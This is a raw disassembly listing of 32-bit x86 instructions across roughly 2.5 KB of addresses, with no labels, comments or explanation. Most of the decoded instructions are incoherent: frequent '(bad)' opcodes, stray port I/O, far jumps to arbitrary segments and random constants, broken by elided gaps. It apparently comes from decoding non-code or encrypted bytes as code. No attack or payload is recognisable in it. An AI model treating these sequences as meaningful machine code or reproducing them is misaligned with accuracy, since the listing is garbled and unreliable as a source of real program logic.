  42c111:	ret    0x308b
  42c114:	inc    edx
  42c115:	(bad)  
  42c116:	gs mov eax,0xd30a5a89
  42c11c:	das    
  42c11d:	mov    al,ds:0x9afa2666
  42c122:	retf   0x9d30
  42c125:	or     DWORD PTR [ecx],0xffffffab
  42c128:	icebp  
  42c129:	ins    DWORD PTR es:[edi],dx
  42c12a:	bound  esp,QWORD PTR [ebx-0x4badf742]
  42c130:	dec    edi
  42c131:	adc    bh,bl
  42c133:	rcl    DWORD PTR [ebp+0x2453d465],1
  42c139:	mov    al,0xf8
  42c13b:	inc    esi
  42c13c:	pop    ds
  42c13d:	ret    0xe466
  42c140:	gs cs push 0x9b29590
  42c147:	mov    ch,0xbf
  42c149:	jnp    0x42c1b0
  42c14b:	pushf  
  42c14c:	lods   eax,DWORD PTR ds:[esi]
  42c14d:	into   
  42c14e:	in     al,dx
  42c14f:	mov    ds:0x71c53e95,al
  42c154:	lahf   
  42c155:	cmp    BYTE PTR [eax+0x59935264],cl
  42c15b:	dec    ebx
  42c15c:	push   esi
  42c15d:	out    dx,al
  42c15e:	cdq    
  42c15f:	enter  0x5c2b,0x59
  42c163:	mov    dl,0x2d
  42c165:	gs dec esp
  42c167:	mov    edx,ecx
  42c169:	inc    esp
  42c16a:	ret    
  42c16b:	sbb    BYTE PTR [edi-0x6c4a0c23],ch
  42c171:	sbb    al,0x24
  42c173:	ins    DWORD PTR es:[edi],dx
  42c174:	and    DWORD PTR [eax+0x1b6a8fa6],ebp
  42c17a:	(bad)  
  42c17b:	(bad)  
  42c17d:	retf   0xd259
  42c180:	loopne 0x42c185
  42c182:	fsubr  st(0),st
  42c184:	pushf  
  42c185:	sbb    dh,BYTE PTR [ecx+ebp*4+0x14]
  42c189:	aaa    
  42c18a:	into   
  42c18b:	mov    dl,0x94
  42c18d:	enter  0x2f98,0xac
	...
  42c1f1:	add    BYTE PTR [eax],al
  42c1f3:	add    BYTE PTR [ecx-0x7e],ch
  42c1f6:	int    0xae
  42c1f8:	out    dx,eax
  42c1f9:	out    dx,eax
  42c1fa:	imul   eax,edi,0xfffffff2
  42c1fd:	nop
  42c1fe:	xchg   esp,eax
  42c1ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c200:	(bad)  
  42c201:	cld    
  42c202:	fxch   st(0)
  42c204:	out    0xd8,al
  42c206:	add    DWORD PTR [eax],eax
  42c208:	add    eax,0xd0000001
  42c20d:	jl     0x42c1c4
  42c20f:	xor    edx,DWORD PTR [ecx+0x819f44e]
  42c215:	xor    al,0xba
  42c217:	mov    edx,cs
  42c219:	cmp    esi,DWORD PTR [ecx+0x50]
  42c21c:	call   0xc35a:0x7032247f
  42c223:	xor    al,0x1a
  42c225:	pop    edi
  42c226:	mov    ch,0x2f
  42c228:	imul   DWORD PTR [edi+0x12]
  42c22b:	outs   dx,DWORD PTR ds:[esi]
  42c22c:	pop    ss
  42c22d:	xor    eax,0xe5982b97
  42c232:	cdq    
  42c233:	pop    ss
  42c234:	fs and esi,esp
  42c237:	mov    ah,0xfc
  42c239:	call   0xbaeb0a59
  42c23e:	push   0x58522c94
  42c243:	adc    DWORD PTR [ecx-0x51],0x59
  42c247:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c248:	add    ebx,edi
  42c24a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c24b:	xchg   esi,eax
  42c24c:	push   ebx
  42c24d:	jns    0x42c27a
  42c24f:	xchg   BYTE PTR [ebp+0x5e],bl
  42c252:	push   eax
  42c253:	sub    al,0x55
  42c255:	cmp    edi,ebx
  42c257:	jecxz  0x42c23c
  42c259:	jle    0x42c238
  42c25b:	pop    ebx
  42c25c:	or     al,0x69
  42c25e:	lahf   
  42c25f:	xor    DWORD PTR [ecx],edx
  42c261:	jne    0x42c2a3
  42c263:	int3   
  42c264:	mov    eax,0x921c87cf
  42c269:	jb     0x42c2cf
  42c26b:	push   edx
  42c26c:	in     al,dx
  42c26d:	push   0x8
  42c26f:	cdq    
  42c270:	sbb    eax,DWORD PTR [eax+0x3d79e487]
  42c276:	nop
  42c277:	fidivr WORD PTR [edi]
  42c279:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c27a:	push   0x77
  42c27c:	lea    ebp,ds:0x821ae3dc
  42c282:	retfw  0x4e7f
  42c286:	in     al,dx
  42c287:	jp     0x42c221
  42c289:	sub    DWORD PTR [ebx],esi
  42c28b:	xchg   BYTE PTR [eax],ah
  42c28d:	sti    
  42c28e:	adc    DWORD PTR [ecx-0x73],ebp
  42c291:	fidivr DWORD PTR [ebp+0x6ac9b5c8]
  42c297:	mov    gs,WORD PTR [edi-0x73e44b5e]
  42c29d:	mov    esi,eax
  42c29f:	and    DWORD PTR fs:[ebp+0x7d822028],ecx
  42c2a6:	xchg   esp,eax
  42c2a7:	add    DWORD PTR [edx],ecx
  42c2a9:	jge    0x42c25e
  42c2ab:	inc    esi
  42c2ac:	mov    cl,0x63
  42c2ae:	jp     0x42c2ca
  42c2b0:	hlt    
  42c2b1:	je     0x42c301
  42c2b3:	sbb    dl,BYTE PTR [edi-0x55]
  42c2b6:	or     eax,0x3a47291a
  42c2bb:	ins    BYTE PTR es:[edi],dx
  42c2bc:	js     0x42c2fb
  42c2be:	mov    ah,dh
  42c2c0:	push   edi
  42c2c1:	cwde   
  42c2c2:	popa   
  42c2c3:	sahf   
  42c2c4:	nop
  42c2c5:	lahf   
  42c2c6:	inc    edi
  42c2c7:	jo     0x42c2a1
  42c2c9:	push   esi
  42c2ca:	sub    al,0x53
  42c2cc:	rol    DWORD PTR [ebx+0x2b7af36a],cl
  42c2d2:	cmp    DWORD PTR [eax+0x47],ebx
  42c2d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c2d6:	ret    
  42c2d7:	sbb    eax,0x43afd24b
  42c2dc:	cmc    
  42c2dd:	mov    dl,0xd4
  42c2df:	(bad)  
  42c2e0:	ins    BYTE PTR es:[edi],dx
  42c2e1:	add    al,0xf
  42c2e3:	jns    0x42c28a
  42c2e5:	enter  0xe88b,0xd8
  42c2e9:	mov    ah,BYTE PTR [ebx]
  42c2eb:	lods   eax,DWORD PTR ds:[esi]
  42c2ec:	lock (bad) 
  42c2ee:	cld    
  42c2ef:	pop    esp
  42c2f0:	push   0x89940352
  42c2f5:	test   DWORD PTR [eax+0x62],edx
  42c2f8:	xor    al,0xc7
  42c2fa:	inc    edi
  42c2fc:	test   BYTE PTR [eax],dl
  42c2fe:	and    al,0xd8
  42c300:	ins    BYTE PTR es:[edi],dx
  42c301:	enter  0x49a0,0x3e
  42c305:	add    al,0x2c
  42c307:	retf   0xee08
  42c30a:	sbb    BYTE PTR [eax],dh
  42c30c:	jecxz  0x42c29f
  42c30e:	ss pop ebx
  42c310:	or     BYTE PTR [eax],al
	...
  42c372:	add    BYTE PTR [eax],al
  42c374:	out    0xf,al
  42c376:	fldcw  WORD PTR [ebp-0x7]
  42c379:	push   esi
  42c37b:	(bad)  
  42c37c:	in     eax,dx
  42c37d:	(bad)  
  42c37e:	sub    eax,0xd21273f6
  42c383:	out    dx,eax
  42c384:	jmp    0x42c35f
  42c386:	add    DWORD PTR [eax],eax
  42c388:	add    eax,0x7e000001
  42c38d:	sbb    al,0xc2
  42c38f:	stos   BYTE PTR es:[edi],al
  42c390:	out    0x6f,al
  42c392:	xchg   esp,eax
  42c393:	mov    ah,0x46
  42c395:	mov    ebp,0x9d9ab4c1
  42c39a:	ret    
  42c39b:	or     esi,DWORD PTR [edi-0x29]
  42c39e:	outs   dx,DWORD PTR ds:[esi]
  42c39f:	jle    0x42c3ea
  42c3a1:	xchg   al,cl
  42c3a3:	push   ds
  42c3a4:	inc    ebp
  42c3a5:	loop   0x42c3af
  42c3a7:	xchg   edx,eax
  42c3a8:	mov    ch,0x9
  42c3aa:	pop    ebp
  42c3ab:	outs   dx,DWORD PTR ds:[esi]
  42c3ac:	inc    esp
  42c3ad:	enter  0xe1ad,0x35
  42c3b1:	cmp    DWORD PTR [ebx],esi
  42c3b3:	inc    ebp
  42c3b4:	or     ah,BYTE PTR ss:[ebx]
  42c3b7:	fwait
  42c3b8:	xchg   BYTE PTR [ebp-0xe],al
  42c3bb:	in     eax,0x4c
  42c3bd:	pop    edx
  42c3be:	inc    edx
  42c3c0:	or     DWORD PTR [eax],edi
  42c3c2:	test   ecx,0x6ce4ec98
  42c3c8:	dec    ecx
  42c3c9:	pop    ebx
  42c3ca:	test   eax,0xf3cf7a09
  42c3cf:	fadd   QWORD PTR [edi-0x50]
  42c3d2:	push   eax
  42c3d3:	(bad)  
  42c3d4:	dec    ecx
  42c3d5:	mov    ebx,0x7239bfb4
  42c3da:	mov    dl,BYTE PTR [ecx+0x6941de12]
  42c3e0:	(bad)  
  42c3e1:	call   0x6e4b:0xdcc6a53e
  42c3e8:	jo     0x42c449
  42c3ea:	xor    DWORD PTR ds:0xbe143b27,0x60656a5b
  42c3f4:	dec    ebx
  42c3f5:	hlt    
  42c3f6:	xor    esp,DWORD PTR [edi+0x2152366b]
  42c3fc:	mov    ebp,0xac36e098
  42c401:	fcmovnb st,st(2)
  42c403:	cld    
  42c404:	dec    esp
  42c405:	stos   BYTE PTR es:[edi],al
  42c406:	mov    es,WORD PTR [ecx-0x1a]
  42c409:	jno    0x42c45f
  42c40b:	test   DWORD PTR cs:0xbb7caac9,0x54fae128
  42c416:	adc    al,0x86
  42c418:	pop    ds
  42c419:	arpl   WORD PTR [edi+0x1c],di
  42c41c:	jbe    0x42c48d
  42c41e:	fadd   QWORD PTR ds:0xcaa3f8de
  42c424:	stos   DWORD PTR es:[edi],eax
  42c425:	adc    eax,0x9a87e5b9
  42c42a:	outs   dx,BYTE PTR ds:[esi]
  42c42b:	mov    ah,0x1e
  42c42d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c42e:	(bad)  
  42c430:	lods   eax,DWORD PTR ds:[esi]
  42c431:	icebp  
  42c432:	sub    eax,0x6cc34dd0
  42c437:	shl    BYTE PTR [eax],0x2
  42c43a:	sub    DWORD PTR [esi],esi
  42c43c:	jno    0x42c3f6
  42c43e:	mov    eax,0x386503d9
  42c443:	mov    dl,0x6e
  42c445:	leave  
  42c446:	fcom   DWORD PTR [edx-0x2fc4f51e]
  42c44c:	call   0x6df5b860
  42c451:	xchg   dh,cl
  42c453:	loopne 0x42c47f
  42c455:	jmp    0x42c40a
  42c457:	adc    eax,0xdaffe239
  42c45c:	dec    ebp
  42c45d:	pop    esp
  42c45e:	call   0x781884c0
  42c463:	lods   al,BYTE PTR ds:[esi]
  42c464:	add    al,0xb4
  42c466:	mov    ds:0x57aa64a8,al
  42c46b:	jecxz  0x42c49e
  42c46d:	std    
  42c46e:	icebp  
  42c46f:	pop    ss
  42c470:	inc    esp
  42c471:	addr16 retf 0x6345
  42c475:	ror    BYTE PTR [esi],1
  42c477:	fs into 
  42c479:	sbb    DWORD PTR [esi],esp
  42c47b:	mov    ebx,0xa7313261
  42c480:	jnp    0x42c41b
  42c482:	(bad)
  42c485:	jmp    0x2469:0xd302370d
  42c48c:	add    DWORD PTR [ebx+0x11dbb7],ebp
	...
  42c4f2:	add    BYTE PTR [eax],al
  42c4f4:	in     al,dx
  42c4f5:	sbb    ebp,edx
  42c4f7:	sahf   
  42c4f8:	cmc    
  42c4f9:	fsubp  st(7),st
  42c4fb:	jnp    0x42c4af
  42c4fd:	sti    
  42c4fe:	enter  0xaa34,0x80
  42c502:	js     0x42c581
  42c504:	lock fiadd DWORD PTR [ecx]
  42c507:	add    BYTE PTR ds:0x53000001,al
  42c50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c50e:	cmp    al,0xa8
  42c510:	xor    DWORD PTR [eax+ecx*4+0x44a420eb],esp
  42c517:	cmp    ebp,eax
  42c519:	inc    edx
  42c51a:	imul   ecx,DWORD PTR [esi+0x1fbf7c77],0xffffffbb
  42c521:	mov    eax,0xedfd9d85
  42c526:	sbb    eax,0xe1c5b36d
  42c52b:	xchg   ebp,eax
  42c52c:	xchg   esi,eax
  42c52d:	sbb    bh,BYTE PTR [esi-0x63]
  42c530:	mov    bl,0x18
  42c532:	jecxz  0x42c593
  42c534:	cmp    eax,0xc9f03250
  42c539:	jg     0x42c58b
  42c53b:	cmp    al,ch
  42c53d:	mov    ah,0x77
  42c53f:	dec    esp
  42c540:	imul   ebx,DWORD PTR [ecx+ecx*1+0x29],0xa
  42c545:	jne    0x42c522
  42c547:	repnz xchg ecx,eax
  42c549:	movnti DWORD PTR [ebx+0xa],esp
  42c54d:	xor    al,0xda
  42c54f:	push   esp
  42c550:	sbb    eax,0xd65b9577
  42c555:	outs   dx,BYTE PTR ds:[esi]
  42c556:	out    dx,al
  42c557:	sbb    al,0x8d
  42c559:	sbb    BYTE PTR [ebx+0x31],bh
  42c55c:	xchg   BYTE PTR [edi-0x3f],bl
  42c55f:	mov    al,ds:0x3c04839f
  42c564:	mov    ah,0xc6
  42c566:	adc    bh,bh
  42c568:	aad    0xe6
  42c56a:	adc    eax,0x62645dd7
  42c56f:	xor    edx,ebx
  42c571:	cmp    eax,0x8008122e
  42c576:	in     al,dx
  42c577:	scas   eax,DWORD PTR es:[edi]
  42c578:	jmp    0xd23:0xa2c30b3f
  42c57f:	cmp    DWORD PTR [ebp+edx*4+0x4b],0xf84119f5
  42c587:	cmp    ebx,DWORD PTR [edi-0x4]
  42c58a:	mov    WORD PTR [edx+0x4d221a31],ss
  42c590:	adc    bl,BYTE PTR [ebp-0x36b89364]
  42c596:	push   esp
  42c597:	ror    DWORD PTR [edi+0x39955b54],cl
  42c59d:	test   al,0x5
  42c59f:	xor    eax,0x628090d1
  42c5a4:	leave  
  42c5a5:	loopne 0x42c5e8
  42c5a7:	mov    ah,BYTE PTR [eax+esi*1]
  42c5aa:	mov    ecx,0x60626689
  42c5af:	adc    eax,0x7bfa9385
  42c5b4:	clc    
  42c5b5:	mov    ds:0x184eacc5,al
  42c5ba:	pop    ss
  42c5bb:	mov    eax,0x86e555f7
  42c5c0:	or     bl,bh
  42c5c2:	ror    edx,0x5b
  42c5c5:	mov    al,ds:0x8930aeb7
  42c5ca:	adc    eax,0x240d8e69
  42c5cf:	mov    bh,0x90
  42c5d1:	xor    DWORD PTR [ebp+0x68],0x15
  42c5d5:	fcmovb st,st(7)
  42c5d7:	ret    
  42c5d8:	xor    al,0xc8
  42c5da:	ror    BYTE PTR [eax+edx*2-0x64],1
  42c5de:	(bad)  
  42c5df:	mov    ebp,0x1403976b
  42c5e4:	sub    cl,BYTE PTR [edx]
  42c5e6:	sub    esi,edi
  42c5e8:	mov    dl,0x4f
  42c5ea:	mov    bh,0x8
  42c5ec:	cmp    al,0x9a
  42c5ee:	sbb    dl,BYTE PTR [ebx+0xb502e8]
  42c5f4:	xchg   BYTE PTR [ebp-0x1b],bh
  42c5f7:	out    0xa0,eax
  42c5f9:	test   al,0x2a
  42c5fb:	int3   
  42c5fc:	sub    BYTE PTR [ebx+0x7],dl
  42c5ff:	xlat   BYTE PTR ds:[ebx]
  42c600:	jge    0x42c61f
  42c602:	(bad)  
  42c603:	pop    edx
  42c604:	rol    BYTE PTR [ecx-0xc78851],0xe1
  42c60b:	or     DWORD PTR [edx-0x3a],0x5ed356
	...
  42c672:	add    BYTE PTR [eax],al
  42c674:	pop    ebp
  42c675:	dec    eax
  42c676:	jle    0x42c606
  42c678:	jg     0x42c638
  42c67a:	std    
  42c67b:	fstp   TBYTE PTR [ebx-0x70920395]
  42c681:	mov    cl,0xe0
  42c683:	nop
  42c684:	cmc    
  42c685:	fild   DWORD PTR [ecx]
  42c687:	add    BYTE PTR ds:0x53000001,al
  42c68d:	xor    DWORD PTR [ebx-0xf],ecx
  42c690:	xor    BYTE PTR [ebx-0x4b],0x18
  42c694:	mov    dh,0xf1
  42c696:	pop    ebp
  42c697:	lods   al,BYTE PTR ds:[esi]
  42c698:	cmp    dl,BYTE PTR [edx]
  42c69a:	sbb    DWORD PTR [eax],ebp
  42c69c:	cmc    
  42c69d:	push   esi
  42c69e:	cdq    
  42c69f:	test   DWORD PTR fs:[ebx+0x533d100a],ebx
  42c6a6:	aam    0xcf
  42c6a8:	std    
  42c6a9:	repz dec edx
  42c6ab:	pop    es
  42c6ac:	je     0x42c6a5
  42c6ae:	jo     0x42c6df
  42c6b0:	call   0x7444fd88
  42c6b5:	test   edx,ecx
  42c6b7:	adc    dl,BYTE PTR [ecx]
  42c6b9:	js     0x42c6d3
  42c6bb:	loope  0x42c66e
  42c6bd:	sbb    esi,DWORD PTR [edx-0x660c18a3]
  42c6c3:	adc    DWORD PTR [edi-0x71b5b469],ebp
  42c6c9:	lds    edi,FWORD PTR [eax]
  42c6cb:	jmp    0x42c6db
  42c6cd:	test   eax,0xf3d29ec1
  42c6d2:	iret   
  42c6d3:	jno    0x42c720
  42c6d5:	sub    al,0x61
  42c6d7:	fldz   
  42c6d9:	inc    esp
  42c6da:	push   ebx
  42c6db:	(bad)  
  42c6dc:	jmp    0x58dd0a19
  42c6e1:	mov    cl,BYTE PTR [ebp+0xc]
  42c6e4:	les    edx,FWORD PTR [eax]
  42c6e6:	aad    0x41
  42c6e8:	in     eax,0xd0
  42c6ea:	mov    edx,0xc8e873c4
  42c6ef:	out    0xd5,eax
  42c6f1:	and    eax,DWORD PTR [edx-0x728cff16]
  42c6f7:	or     eax,0x77089a1d
  42c6fc:	jns    0x42c74f
  42c6fe:	loope  0x42c6f3
  42c700:	xor    ebp,DWORD PTR [edi+0x3e886059]
  42c706:	mov    bh,0x85
  42c708:	lea    ecx,[ecx-0x351e1f15]
  42c70e:	sbb    ch,cl
  42c710:	cmp    cl,BYTE PTR [ebx-0x3e6289c7]
  42c716:	repnz (bad) 
  42c718:	fidiv  WORD PTR [ebx]
  42c71a:	adc    al,0x57
  42c71c:	inc    ebp
  42c71d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42c71e:	xlat   BYTE PTR ds:[ebx]
  42c71f:	(bad)  
  42c720:	jmp    0xf99e:0xf5323480
  42c727:	add    DWORD PTR [ebp+0x6f9e4fb4],edi
  42c72d:	data16 int 0xb2
  42c730:	add    al,ch
  42c732:	inc    edi
  42c733:	cmc    
  42c734:	push   0x2402546d
  42c739:	and    DWORD PTR [esp+ebx*8+0x17963a4d],esp
  42c740:	sub    ah,BYTE PTR [ebx+esi*2-0x269945b3]
  42c747:	xchg   dl,dh
  42c749:	xchg   edi,eax
  42c74a:	or     DWORD PTR [eax],0xa3b43042
  42c750:	outs   dx,BYTE PTR ds:[esi]
  42c751:	mov    ecx,0xf2511a0c
  42c756:	mov    ds:0x5dc6ce3f,eax
  42c75b:	psadbw mm1,QWORD PTR [ecx]
  42c75e:	and    DWORD PTR [eax-0x1e66721d],0xfbdf33be
  42c768:	loopne 0x42c7a5
  42c76a:	xor    bh,BYTE PTR [ebp-0x4e]
  42c76d:	jmp    0xca4e1992
  42c772:	or     cl,ch
  42c774:	dec    eax
  42c775:	jo     0x42c742
  42c777:	cmp    eax,0x57621793
  42c77c:	and    BYTE PTR [esi],dh
  42c77e:	mov    ebx,0x2ede256a
  42c783:	data16 xlat BYTE PTR ds:[ebx]
  42c785:	push   ss
  42c786:	sub    BYTE PTR [eax-0x565e649c],cl
  42c78c:	and    edx,DWORD PTR [edx+0x9e31f2]
	...
  42c7f2:	add    BYTE PTR [eax],al
  42c7f4:	cmp    BYTE PTR [ecx-0x8046a96],cl
  42c7fa:	jmp    FWORD PTR [ebp-0x5bf1e2a3]
  42c800:	inc    ecx
  42c801:	xchg   edx,eax
  42c802:	jns    0x42c833
  42c804:	cli    
  42c805:	fadd   QWORD PTR [ecx]
  42c807:	add    BYTE PTR ds:0xdd000001,al
  42c80d:	sbb    al,0x9e
  42c80f:	nop
  42c810:	arpl   WORD PTR [edx],si
  42c812:	sti    
  42c813:	mov    cs,WORD PTR [esi-0x3dc4b3fb]
  42c819:	push   ss
  42c81a:	rol    DWORD PTR [edx-0x73],0xd
  42c81e:	aad    0x52
  42c820:	loopne 0x42c7a9
  42c822:	mov    cl,0xc8
  42c824:	mov    eax,0xe0e3decd
  42c829:	sar    bl,0x47
  42c82c:	or     edx,ebp
  42c82e:	sahf   
  42c82f:	(bad)  
  42c830:	jg     0x42c852
  42c832:	(bad)  
  42c833:	mov    DWORD PTR [eax],ebx
  42c835:	loopne 0x42c891
  42c837:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42c838:	jge    0x42c7ec
  42c83a:	nop
  42c83b:	retf   0x3c61
  42c83e:	pop    ds
  42c83f:	push   esp
  42c840:	rcl    BYTE PTR [edx],cl
  42c842:	retf   
  42c843:	jno    0x42c7fe
  42c845:	iret   
  42c846:	js     0x42c88a
  42c848:	mov    edx,0xf8b15d88
  42c84d:	cmp    BYTE PTR [ebx-0x7b9187ea],ah
  42c853:	mov    ds:0x6e3404ba,eax
  42c858:	(bad)  
  42c85b:	adc    al,0x50
  42c85d:	jg     0x42c839
  42c85f:	scas   al,BYTE PTR es:[edi]
  42c860:	cmp    eax,0x92ed06f3
  42c865:	fidiv  WORD PTR [edi]
  42c867:	aaa    
  42c868:	pushf  
  42c869:	and    BYTE PTR [ecx-0x280ff6e2],cl
  42c86f:	retf   
  42c870:	add    al,0x71
  42c872:	push   edx
  42c873:	aam    0x6a
  42c875:	mov    BYTE PTR [ebx+0x79ebe44f],dl
  42c87b:	ret    
  42c87c:	lods   al,BYTE PTR ds:[esi]
  42c87d:	retf   0xcbbb
  42c880:	mov    ds:0x454c2970,eax
  42c885:	test   al,0x84
  42c887:	jo     0x42c870
  42c889:	iret   
  42c88a:	enter  0xd9d5,0xa
  42c88e:	sub    al,0x8c
  42c890:	div    BYTE PTR [edx-0x56]
  42c893:	jnp    0x42c8cf
  42c895:	(bad)  
  42c896:	popf   
  42c897:	mov    ds:0xeb75e4c9,al
  42c89c:	add    cl,cl
  42c89e:	mov    dl,0x70
  42c8a0:	jmp    0xba81a63c
  42c8a5:	je     0x42c87b
  42c8a7:	inc    ebx
  42c8a8:	adc    eax,0xddec4c86
  42c8ad:	adc    al,0xf7
  42c8af:	out    dx,eax
  42c8b0:	lods   eax,DWORD PTR ds:[esi]
  42c8b1:	mov    edx,0xb60d86ee
  42c8b6:	sub    edi,DWORD PTR [eax-0xc15ed6]
  42c8bc:	ins    DWORD PTR es:[edi],dx
  42c8bd:	push   0x7d
  42c8bf:	sub    eax,0x1cc695b0
  42c8c4:	into   
  42c8c5:	xor    ebp,DWORD PTR [ecx-0x8]
  42c8c8:	mov    ebp,0x337087ef
  42c8cd:	sub    eax,0x5847b6e
  42c8d2:	aam    0xec
  42c8d4:	out    dx,al
  42c8d5:	aas    
  42c8d6:	sahf   
  42c8d7:	mov    ecx,ebp
  42c8d9:	or     al,0x10
  42c8db:	push   ecx
  42c8dc:	into   
  42c8dd:	shl    BYTE PTR [eax+eax*4-0x40],1
  42c8e1:	add    ch,BYTE PTR [esi]
  42c8e3:	rcr    BYTE PTR [ebx-0x225d1665],cl
  42c8e9:	sub    DWORD PTR [ebx-0x24d5134c],ebx
  42c8ef:	or     cl,ah
  42c8f1:	sbb    BYTE PTR [ebx-0x5],0x1d
  42c8f5:	jnp    0x42c94a
  42c8f7:	ror    DWORD PTR [esi],0x63
  42c8fa:	dec    edx
  42c8fb:	add    esi,DWORD PTR [esi-0x3d558d72]
  42c901:	sbb    DWORD PTR [eax],0xebe4f4ee
  42c907:	push   esp
  42c908:	cmp    ecx,ecx
  42c90a:	dec    eax
  42c90c:	adc    BYTE PTR [ebp-0x7e],0xf8
  42c910:	cli    
	...
  42c971:	add    BYTE PTR [eax],al
  42c973:	add    BYTE PTR [eax],dl
  42c975:	sbb    ecx,ecx
  42c977:	jmp    0xfb73c547
  42c97c:	(bad)  
  42c97d:	scas   eax,DWORD PTR es:[edi]
  42c97e:	inc    edi
  42c97f:	call   0x387d69c5
  42c984:	(bad)  
  42c985:	fld    QWORD PTR [ecx]
  42c987:	add    BYTE PTR ds:0x10000001,al
  42c98d:	xchg   ebp,eax
  42c98e:	push   ebx
  42c98f:	xchg   ecx,eax
  42c990:	pop    es
  42c991:	sub    al,0x5b
  42c993:	add    eax,0x2ca6c789
  42c998:	mov    dl,0xcf
  42c99a:	xchg   edx,eax
  42c99b:	and    dl,BYTE PTR [ebp-0x90a25f]
  42c9a1:	lods   eax,DWORD PTR ds:[esi]
  42c9a2:	(bad)  
  42c9a3:	aad    0x7a
  42c9a5:	leave  
  42c9a6:	mov    ecx,0xb0d75ac7
  42c9ab:	xchg   ebx,eax
  42c9ac:	cmp    cl,ah
  42c9ae:	xor    esi,ecx
  42c9b0:	icebp  
  42c9b1:	sub    BYTE PTR ds:0x422bb24a,al
  42c9b7:	aas    
  42c9b8:	adc    BYTE PTR [ecx+0x4a],bl
  42c9bb:	in     eax,0xb5
  42c9bd:	or     DWORD PTR [edx+eax*8-0x4e],edx
  42c9c1:	or     dl,BYTE PTR [edx]
  42c9c3:	stos   BYTE PTR es:[edi],al
  42c9c4:	ss and al,0xb9
  42c9c7:	pop    ss
  42c9c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42c9c9:	cdq    
  42c9ca:	out    0x51,eax
  42c9cc:	mov    esp,0x8bb81f24
  42c9d1:	mov    al,ds:0x462e3c87
  42c9d6:	or     DWORD PTR [ecx+0x64],ecx
  42c9d9:	inc    esp
  42c9da:	dec    esi
  42c9db:	scas   al,BYTE PTR es:[edi]
  42c9dc:	mov    ds:0x8837f495,al
  42c9e1:	retf   
  42c9e2:	jmp    0x42ca4a
  42c9e4:	xlat   BYTE PTR ds:[ebx]
  42c9e5:	push   cs
  42c9e6:	mov    edi,DWORD PTR [esi-0x78]
  42c9e9:	sbb    edi,DWORD PTR [eax]
  42c9eb:	fs jl  0x42c99e
  42c9ee:	aad    0xd6
  42c9f0:	aad    0x44
  42c9f2:	lahf   
  42c9f3:	and    al,BYTE PTR [esi-0x4905e949]
  42c9f9:	jle    0x42ca0b
  42c9fb:	push   0xffffff97
  42c9fd:	fwait
  42c9fe:	out    dx,eax
  42c9ff:	aad    0x52
  42ca01:	jno    0x42ca10
  42ca03:	lods   eax,DWORD PTR ds:[esi]
  42ca04:	fcmovb st,st(0)
  42ca06:	add    eax,0xb1b56666
  42ca0b:	mov    esp,0x1a975947
  42ca10:	fsub   st,st(2)
  42ca12:	mov    edi,0x8c365903
  42ca17:	dec    esp
  42ca18:	and    ch,al
  42ca1a:	ret    
  42ca1b:	hlt    
  42ca1c:	adc    DWORD PTR [edi-0x60],0xbb2f41fd
  42ca23:	stc    
  42ca24:	xchg   ebp,eax
  42ca25:	jg     0x42ca51
  42ca27:	jae    0x42caa5
  42ca29:	les    esp,FWORD PTR [ecx+edi*2]
  42ca2c:	mov    dl,0x7
  42ca2e:	test   DWORD PTR [ebx-0x27d26fbf],0x278d1c8f
  42ca38:	and    edi,esp
  42ca3a:	sti    
  42ca3b:	test   al,0x5c
  42ca3d:	test   ah,0x7b
  42ca40:	mov    bh,0xf8
  42ca42:	inc    edx
  42ca43:	and    ebp,DWORD PTR [edx+0x16]
  42ca46:	ins    BYTE PTR es:[edi],dx
  42ca47:	sbb    al,0xc0
  42ca49:	xchg   ecx,eax
  42ca4a:	xchg   BYTE PTR [edi],bh
  42ca4c:	push   eax
  42ca4d:	jg     0x42c9e1
  42ca4f:	ret    0x8b44
  42ca52:	push   edx
  42ca53:	ins    BYTE PTR es:[edi],dx
  42ca54:	push   DWORD PTR ss:[ebx+0x2d]
  42ca58:	je     0x42ca53
  42ca5a:	jno    0x42caa7
  42ca5c:	mov    cl,0xe7
  42ca5e:	adc    DWORD PTR [ebp-0x1],edi
  42ca61:	sub    dl,BYTE PTR [edx+0x6394eb6a]
  42ca67:	mov    esp,0xdfa3e2a3
  42ca6c:	retf   0xa8f7
  42ca6f:	jl     0x42caa9
  42ca71:	xor    BYTE PTR [esi+0x19],bl
  42ca74:	pop    ss
  42ca75:	xor    BYTE PTR [esp+ebp*8+0x2969b644],bl
  42ca7c:	sbb    ch,al
  42ca7e:	ror    BYTE PTR [ebx],0x4
  42ca81:	loope  0x42caa6
  42ca83:	mov    ds:0x55e0d593,al
  42ca88:	iret   
  42ca89:	ss dec esp
  42ca8b:	jo     0x42cade
  42ca8d:	shr    BYTE PTR [eax+0x722c],cl
	...
  42caf3:	add    BYTE PTR [edi-0x2be7726],ah
  42caf9:	push   ebx
  42cafa:	out    dx,eax
  42cafb:	(bad)  
  42cafc:	fadd   QWORD PTR [ebp+0x2e136ec0]
  42cb02:	scas   al,BYTE PTR es:[edi]
  42cb03:	dec    esp
  42cb04:	add    al,0xdf
  42cb06:	add    DWORD PTR [eax],eax
  42cb08:	add    eax,0x76000001
  42cb0d:	mov    edi,0xb2dd2fd
  42cb12:	scas   eax,DWORD PTR es:[edi]
  42cb13:	cld    
  42cb14:	sbb    BYTE PTR [eax-0x30f3d0d5],bl
  42cb1a:	cmp    al,0xaf
  42cb1c:	sti    
  42cb1d:	mov    ebp,0x2a6f4667
  42cb22:	mov    edx,0x8256aec4
  42cb27:	push   ss
  42cb28:	addr16 aad 0x25
  42cb2b:	scas   al,BYTE PTR es:[edi]
  42cb2c:	stc    
  42cb2d:	icebp  
  42cb2e:	imul   ebp
  42cb30:	hlt    
  42cb31:	or     al,0xd0
  42cb33:	inc    BYTE PTR [esi+0x256e53d6]
  42cb39:	es daa 
  42cb3b:	mov    edi,0x4712f240
  42cb40:	call   0xf1a8:0x201bba1
  42cb47:	(bad)  [edi-0x2e]
  42cb4a:	(bad)  [edi-0x63]
  42cb4e:	loope  0x42cb19
  42cb50:	sbb    BYTE PTR [ebp-0x53],bh
